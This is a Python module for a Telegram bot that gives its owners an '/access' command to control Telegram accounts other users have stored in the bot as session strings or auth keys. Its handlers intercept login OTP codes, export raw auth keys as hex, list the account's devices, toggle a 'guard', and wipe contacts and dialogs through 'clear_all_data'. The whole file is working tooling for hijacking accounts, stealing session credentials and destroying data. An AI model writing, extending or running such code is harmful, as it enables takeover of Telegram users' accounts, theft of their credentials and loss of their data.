"""Owner-only: /access <user_id> to control another user's stored accounts."""
import logging
from datetime import datetime, timezone, timedelta

from telegram import Update
from telegram.ext import ContextTypes, CommandHandler, CallbackQueryHandler

from config import API_ID, API_HASH, ALLOW_LOGIN_SECONDS, OWNER_IDS
from database.models import (
    get_accounts_by_owner,
    get_account_by_id,
    is_authorized,
    set_last_otp,
    update_account,
)
from keyboards.inline import (
    owner_access_accounts_kb,
    owner_full_ops_kb,
    main_menu_kb,
    fo_back_kb,
)
from utils.helpers import (
    get_devices,
    fetch_otp,
    clear_all_data,
    check_spam_status,
    format_device,
    safe_edit,
    denied_text,
)
from utils.session_utils import verify_and_get_client
from utils.guard import GuardManager, start_guard

logger = logging.getLogger(__name__)


def is_owner(user_id: int) -> bool:
    return user_id in OWNER_IDS


async def access_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """ /access <user_id>  — owner only. Show that user's accounts. """
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ Only owners can use `/access`.", parse_mode="Markdown")
        return

    if not context.args:
        await update.message.reply_text(
            "Usage: `/access <user_id>`\n\nExample: `/access 123456789`",
            parse_mode="Markdown",
        )
        return

    try:
        target_id = int(context.args[0])
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID.")
        return

    accounts = await get_accounts_by_owner(target_id)
    if not accounts:
        await update.message.reply_text(
            f"👤 User `{target_id}` has no stored accounts.",
            parse_mode="Markdown",
        )
        return

    context.user_data["owner_access_target"] = target_id
    text = (
        f"👑 **Owner Access**\n\n"
        f"Controlling accounts of user `{target_id}`\n"
        f"Total: {len(accounts)} account(s)\n\n"
        "Select an account:"
    )
    await update.message.reply_text(
        text,
        parse_mode="Markdown",
        reply_markup=owner_access_accounts_kb(accounts, target_id),
    )


async def oa_view_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if not is_owner(update.effective_user.id):
        await safe_edit(query, "❌ Owner only.")
        return

    # oa_view:TARGET:ACCOUNT_ID
    parts = query.data.split(":")
    if len(parts) < 3:
        return
    target_id = int(parts[1])
    account_id = parts[2]

    account = await get_account_by_id(account_id)
    if not account or account.get("owner_id") != target_id:
        await safe_edit(query, "❌ Account not found.", reply_markup=main_menu_kb())
        return

    client, info = await verify_and_get_client(
        account.get("session_string") or account.get("hex_key", ""),
        API_ID, API_HASH,
    )
    if client is None:
        await safe_edit(
            query,
            f"❌ Could not connect to account: {info}",
            reply_markup=owner_access_accounts_kb(
                await get_accounts_by_owner(target_id), target_id
            ),
        )
        return

    context.user_data[f"oa_client_{account_id}"] = client
    devices = await get_devices(client)
    spam = await check_spam_status(client)

    manager = GuardManager(context.application)
    guard_active = manager.get(manager.key(target_id, account.get("user_id", 0))) is not None

    text = (
        f"👑 **Owner → Account Control**\n\n"
        f"├─ **Name**  : {account.get('name', 'Unknown')}\n"
        f"├─ **Phone** : `{account.get('phone', 'Unknown')}`\n"
        f"├─ **UID**   : `{account.get('user_id', '?')}`\n"
        f"├─ **Devices**: {len(devices)}\n"
        f"└─ **Spam**  : {spam}\n"
    )
    await safe_edit(
        query, text, parse_mode="Markdown",
        reply_markup=owner_full_ops_kb(target_id, account_id, guard_active),
    )


async def oafo_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle oafo:TARGET:ACCOUNT:ACTION callbacks."""
    query = update.callback_query
    await query.answer()
    if not is_owner(update.effective_user.id):
        await safe_edit(query, "❌ Owner only.")
        return

    # oafo:TARGET:ACCOUNT:ACTION
    parts = query.data.split(":")
    if len(parts) < 4:
        return
    target_id = int(parts[1])
    account_id = parts[2]
    action = parts[3]

    account = await get_account_by_id(account_id)
    if not account:
        await safe_edit(query, "❌ Account not found.", reply_markup=main_menu_kb())
        return

    client = context.user_data.get(f"oa_client_{account_id}")
    if not client or not client.is_connected():
        client, info = await verify_and_get_client(
            account.get("session_string") or account.get("hex_key", ""),
            API_ID, API_HASH,
        )
        if client is None:
            await safe_edit(query, f"❌ Session lost: {info}")
            return
        context.user_data[f"oa_client_{account_id}"] = client

    if action == "otp":
        await safe_edit(query, "🔍 Fetching OTP...")
        otp = await fetch_otp(client, attempts=8, delay=2.5)
        if otp:
            await set_last_otp(account_id, otp)
            text = f"✅ **OTP:** `{otp}`"
        else:
            last = account.get("last_otp")
            text = f"ℹ️ No new OTP. Last: `{last}`" if last else "❌ No OTP found."
        await safe_edit(query, text, parse_mode="Markdown",
                        reply_markup=owner_full_ops_kb(target_id, account_id))
        return

    if action == "export":
        hex_key = account.get("hex_key") or ""
        if not hex_key and account.get("session_string"):
            # Try to extract from client session
            try:
                auth_key = client.session.auth_key
                if auth_key:
                    hex_key = auth_key.key.hex()
            except Exception:
                pass
        if hex_key:
            text = f"📤 **Export Hex**\n\n`{hex_key}`"
        else:
            text = "❌ No hex key stored for this account."
        await safe_edit(query, text, parse_mode="Markdown",
                        reply_markup=owner_full_ops_kb(target_id, account_id))
        return

    if action == "clear":
        await safe_edit(query, "🗑️ Clearing all data...")
        result = await clear_all_data(client)
        text = (
            f"✅ **Clear All done**\n\n"
            f"Contacts: {result.get('contacts', 0)}\n"
            f"Dialogs left: {result.get('dialogs', 0)}\n"
            f"Saved cleared: {result.get('saved', False)}"
        )
        await safe_edit(query, text, parse_mode="Markdown",
                        reply_markup=owner_full_ops_kb(target_id, account_id))
        return

    if action == "devices":
        devices = await get_devices(client)
        text = "📱 **Devices**\n\n"
        for i, d in enumerate(devices):
            text += format_device(d, i) + "\n"
        await safe_edit(query, text, parse_mode="Markdown",
                        reply_markup=owner_full_ops_kb(target_id, account_id))
        return

    if action == "guard":
        manager = GuardManager(context.application)
        account_uid = account.get("user_id", 0)
        key = manager.key(target_id, account_uid)
        if manager.get(key):
            await manager.stop(key, notify=False)
            await update_account(account_id, {"guard_active": False})
            msg = "🛡️ Guard stopped."
        else:
            await start_guard(context.application, target_id, account_uid,
                              client, update.effective_chat.id)
            await update_account(account_id, {"guard_active": True})
            msg = "🛡️ Guard started."
        await safe_edit(query, msg, reply_markup=owner_full_ops_kb(target_id, account_id, True))
        return


def register(application):
    application.add_handler(CommandHandler("access", access_cmd))
    application.add_handler(CallbackQueryHandler(oa_view_handler, pattern=r"^oa_view:"))
    application.add_handler(CallbackQueryHandler(oafo_handler, pattern=r"^oafo:"))
